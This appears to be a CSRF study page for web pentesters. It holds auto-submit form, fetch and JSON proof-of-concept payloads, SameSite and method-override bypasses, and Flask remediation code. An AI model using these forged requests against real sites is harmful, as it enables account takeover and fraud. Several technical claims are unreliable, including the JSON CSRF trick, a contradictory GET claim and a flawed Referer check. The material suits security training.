OWASP A05 · CVSS 8.8 · Day 3

CSRF (Cross-Site Request Forgery)

Trick a user into performing unintended actions on their account through a malicious website while they're logged in.

High BSCP Exam Topic Difficulty: Beginner

🎯 Real-World Analogy

The Blank Check Scam

You receive an email: "Click here to claim your prize!" You click the link while logged into your bank account. The page loads an invisible form that auto-submits a request to your bank, transferring $1,000 to a stranger's account. The bank server sees your valid session cookie and your valid digital signature, so it approves the transfer. You didn't intend to sign that check · the attacker tricked you into it.

CSRF works the same way: the browser auto-includes your login cookie with requests to the target site, so a malicious page can forge requests that look like they came from you.

🎯 Day 3 · CSRF Testing

On Day 3, examine every state-changing request in Burp HTTP history. For each POST/PUT/DELETE that changes state (password, email, settings, money transfer): check if a CSRF token is present. If yes · is it actually validated server-side? Test by removing it or changing one character. If no token · build a quick auto-submit PoC form and test in a second browser session.

<!-- Quick CSRF PoC test -->
<form action="https://target.com/account/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
  <input type="submit" value="Auto-submit">
</form>
<script>document.forms[0].submit();</script>

Also check: does a GET version of the action exist? Does it work without a token? Does changing Content-Type: application/json bypass the check?

Chain it: CSRF → change victim's email → trigger password reset → full account takeover. Or CSRF → add attacker's SSH key → persistent access.

⚙️ How It Works

The Core Problem

Browsers automatically include cookies in HTTP requests to the target domain, even if the request originates from another site. This design allows for convenience (you stay logged in), but it also enables forgery:

  1. You log into your-bank.com · your browser stores a session cookie: sessionid=abc123
  2. You visit attacker.com (while still logged into the bank)
  3. Attacker.com contains a hidden form: 
    <form action="https://your-bank.com/transfer" method="POST">
  <input type="hidden" name="to_account" value="attacker_account">
  <input type="hidden" name="amount" value="1000">
</form>
<script>
  document.forms[0].submit();
</script>
  4. Your browser submits the form · and automatically includes your sessionid=abc123 cookie
  5. Your-bank.com receives the request: It checks: "Is the sessionid valid?" Yes. "Is this a legit transfer request?" It assumes yes, because the request came with a valid session.
  6. The transfer happens · and you didn't authorize it.

Why It Happens

The server has no way to distinguish between:

  • A request you intentionally made (clicking a button on your-bank.com)
  • A forged request from attacker.com that your browser auto-submitted

Both include your valid session cookie. Both come from your IP address. Without a CSRF token (a unique, unpredictable value that the page generates and the server validates), the server cannot prove you intended the request.

🔍 Where to Look

What Requests Are Vulnerable?

CSRF only affects state-changing requests. Safe requests (reads) are not vulnerable:

  • Vulnerable: POST, PUT, DELETE, PATCH (change data)
  • Not vulnerable: GET (read-only)

High-Risk Endpoints

  • Password change: POST /account/change-password
  • Email change: POST /account/update-email
  • Payment/transfer: POST /transfer, POST /payment/charge
  • Account settings: POST /settings/update
  • Delete account: DELETE /account
  • Add admin user: POST /admin/users
  • Disable 2FA: POST /security/disable-2fa

How to Check for CSRF Protection

  1. Open the page with the state-changing form in your browser
  2. Right-click → Inspect → look for a hidden input field like: 
    <input type="hidden" name="csrf_token" value="a1b2c3d4...">
  3. If no token exists, the form is likely vulnerable
  4. If a token exists, check if it's:
    • Unique per request or per session?
    • Server-side validated on submission?
    • Tied to the user's session?

Check Cookie SameSite Attribute

Modern CSRF defense: browsers can restrict when cookies are sent cross-site. In Burp or DevTools, check the session cookie:

  • SameSite=Strict: Cookie only sent to same site (best)
  • SameSite=Lax: Cookie sent on top-level navigations (safe for most cases)
  • No SameSite or SameSite=None: Cookie sent on all cross-site requests (vulnerable)

🎯 Burp Suite Workflow

1
Find a state-changing request

Log in to the target application. Perform an action that changes state (change password, update email, transfer money). Intercept the POST/PUT request in Burp Proxy.

2
Send to Repeater

Right-click the request → "Send to Repeater". This lets you replay the request multiple times.

3
Remove or modify the CSRF token

Find the CSRF token in the request body (e.g., csrf_token=abc123). Try:

  • Delete it entirely
  • Change it to a random value like csrf_token=invalid123
  • Copy a token from a different request

Click "Send" and check the response. If the request succeeds (HTTP 200, no error message), the app isn't validating the token · it's vulnerable.

4
Generate a CSRF PoC

Right-click the original request → "Engagement tools" → "Generate CSRF PoC". Burp creates an HTML file with a form that mimics the request. It looks like:

<form action="https://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="csrf_token" value="abc123">
</form>
<script>document.forms[0].submit();</script>
5
Test the PoC

Save the PoC to a file. Open it in a browser while logged into the target app (in the same browser instance). If the hidden form auto-submits and the action completes, CSRF is confirmed.

6
Check SameSite cookie attribute

Go to Burp → "Cookies" (under Proxy settings) or check DevTools Application → Cookies. Look for the session cookie and note its "SameSite" value. If it's None or missing, that's a secondary vulnerability.

🎣 Payloads & Techniques

1. Auto-Submit HTML Form (GET Method)

If the vulnerable endpoint accepts GET:

<img src="https://target.com/transfer?to=attacker&amount=9999" style="display:none">

The browser loads the image, which triggers the request with your session cookie.

2. Auto-Submit HTML Form (POST Method)

<html>
<body onload="document.forms[0].submit()">
<form action="https://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
</form>
</body>
</html>

3. JSON CSRF (Content-Type Trick)

Many modern apps use JSON APIs. If the app doesn't enforce CSRF on JSON endpoints, you can forge JSON requests:

<script>
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/api/transfer', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
  "to_account": "attacker",
  "amount": 1000
}));
</script>

This only works if the app doesn't require a CSRF token for JSON requests.

4. Multipart Form CSRF

<form action="https://target.com/upload-avatar" method="POST" enctype="multipart/form-data">
  <input type="file" name="avatar" value="/tmp/malicious.jpg">
  <input type="submit">
</form>

5. Modifying Token to Null or Empty

Some apps fail open when the token is missing. Try:

  • csrf_token= (empty string)
  • csrf_token=null (literal null)
  • csrf_token=0
  • Omit the parameter entirely

🚀 WAF Bypass Techniques

1. HTTP Method Variation

If POST is protected but PUT is not:

<form action="https://target.com/settings" method="POST">
  <!-- Try changing to PUT via override header -->
  <input type="hidden" name="_method" value="PUT">
  <input type="hidden" name="email" value="attacker@example.com">
</form>

2. SameSite Bypass via Subdomain

If the app uses SameSite=Lax but has an open subdomain (e.g., files.target.com), you can host the PoC there and bypass SameSite:

https://files.target.com/csrf-poc.html (hosted by attacker, but SameSite allows it)

3. Cookie Tossing with Subdomain

If the app sets cookies on .target.com, an attacker-controlled subdomain can set a cookie that shadows the session:

Set-Cookie: sessionid=attacker_controlled_value; Domain=.target.com

4. Crafting Requests Without HTML Forms

If HTML forms are blocked, use JavaScript fetch:

<script>
fetch('https://target.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'to_account=attacker&amount=1000'
});
</script>

5. Timing Window Exploitation

If CSRF tokens are single-use but have a wide validation window, forge multiple requests in rapid succession before the token expires.

💥 Exploitation & Impact

What Can an Attacker Do?

  • Account Takeover: Change password, email, recovery phone · lock the real user out
  • Financial Fraud: Transfer money, make purchases, update payment methods
  • Privilege Escalation: Promote themselves to admin in a CMS or application
  • Data Destruction: Delete user data, reset configurations
  • Malware Distribution: Upload malicious files, inject scripts into user profiles
  • Service Disruption: Spam other users, disable security features

Real-World Example: GitHub CSRF (2010)

GitHub (before modern CSRF fixes) had a vulnerability where an attacker could trick a logged-in user into adding their SSH public key to the victim's account via a CSRF form. This granted the attacker access to all repositories the victim could access.

Proof-of-Concept Scenario

Attacker sends victim an email with a link to a seemingly innocent page. The page contains a hidden form that changes the victim's password. After one click, the attacker controls the victim's account.

🛡️ Remediation

1. CSRF Tokens (Double-Submit Cookie Pattern)

Server-side (Python/Flask example):

from flask import session, request
import secrets

@app.route('/transfer', methods=['POST'])
def transfer():
    # Validate CSRF token
    token = request.form.get('csrf_token')
    session_token = session.get('csrf_token')

    if not token or token != session_token:
        return "CSRF token invalid", 403

    # Proceed with transfer
    to_account = request.form.get('to_account')
    amount = request.form.get('amount')
    # ... transfer logic ...
    return "Transfer successful", 200

@app.route('/transfer-form')
def transfer_form():
    # Generate a unique token per session
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)

    return render_template('transfer.html', csrf_token=session['csrf_token'])

Template (transfer.html):

<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
  <input type="text" name="to_account" placeholder="Account number">
  <input type="number" name="amount" placeholder="Amount">
  <button type="submit">Transfer</button>
</form>

2. SameSite Cookie Attribute

Server-side (set session cookie with SameSite=Strict):

response.set_cookie('sessionid',
                     value=session_value,
                     httponly=True,
                     secure=True,
                     samesite='Strict')

SameSite values:

  • Strict: Cookie never sent cross-site (most secure, may break some workflows)
  • Lax: Cookie sent on top-level navigations (default in most browsers, good balance)
  • None: Cookie sent on all requests (requires Secure flag; only use if necessary)

3. Validate Origin and Referer Headers

@app.route('/transfer', methods=['POST'])
def transfer():
    origin = request.headers.get('Origin') or request.headers.get('Referer')
    allowed_origins = ['https://myapp.com', 'https://www.myapp.com']

    if origin not in allowed_origins:
        return "Forbidden", 403

    # ... rest of logic ...

4. Use a CSRF Token Library

Django: Built-in CSRF middleware (automatically validates tokens)

{% csrf_token %}

Flask: Use Flask-WTF library

from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)

5. For APIs (REST/JSON)

Don't rely on cookies; use token-based authentication (JWT, API keys):

fetch('https://target.com/api/transfer', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer ' + jwt_token,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ to_account: 'x', amount: 100 })
});

CSRF tokens are needed only if you're using cookies for session management.

⚠️ Common Beginner Mistakes

1. Assuming JSON Requests Are CSRF-Safe

Wrong: "The app uses JSON API, so it's safe from CSRF."

Reality: You can send JSON requests from a browser if cookies are included. CSRF still applies unless the app requires a token or has SameSite cookies.

2. Not Checking SameSite Cookie Attribute

Wrong: Testing CSRF by removing the token but forgetting to check if SameSite=Strict is set.

Reality: If SameSite=Strict is set, the browser won't send the cookie cross-site anyway · that's defense, not vulnerability. But if it's missing or set to None, CSRF is still possible.

3. Testing CSRF Only in the Same Browser Session

Wrong: Opening the PoC in the same browser tab while already logged in, but not opening it in the "normal browsing flow" (where cookies are auto-sent).

Reality: Cookies are sent automatically in any request to the target domain, even cross-site · you don't need to "manually" add them. Your browser does it.

4. Not Testing GET-Based CSRF

Wrong: Only testing POST endpoints for CSRF.

Reality: Some state-changing operations accept GET (a design flaw). These are highly vulnerable to CSRF because even an image tag or redirect can trigger them.

5. Ignoring HTTP Method Overrides

Wrong: The form uses POST, and the app seems to reject GET · conclusion: not vulnerable.

Reality: Check if the app accepts method override headers like X-HTTP-Method-Override: PUT or _method=PUT in the form body. Some frameworks support this for API compatibility.

6. Not Testing Token Reuse Across Requests

Wrong: A token is valid, so CSRF protection must be working.

Reality: If the same token works for multiple different requests, it's not tied to the specific action · an attacker can reuse it. Test by using the same token in different requests (change password vs. change email).

7. Missing Indirect References

Wrong: Testing obvious form parameters but not checking hidden fields or POST body parameters.

Reality: CSRF tokens are often in hidden inputs or nested JSON · always inspect the full request body, not just the visible form fields.

🔗 See Also · Attack Chains

CSRF is most dangerous when chained · a CSRF on an email-change endpoint leads to full account takeover.

⚡ XSS XSS makes CSRF trivial · execute any state-changing request from victim's authenticated session. 🌍 CORS Both exploit browser trust. Misconfigured CORS + CSRF = attacker reads AND writes cross-origin. 🖱️ Clickjacking Clickjacking is a variant of CSRF · tricks user into performing an action via invisible iframe. 🔗 OAuth Missing state parameter in OAuth is essentially CSRF on the authorization flow.
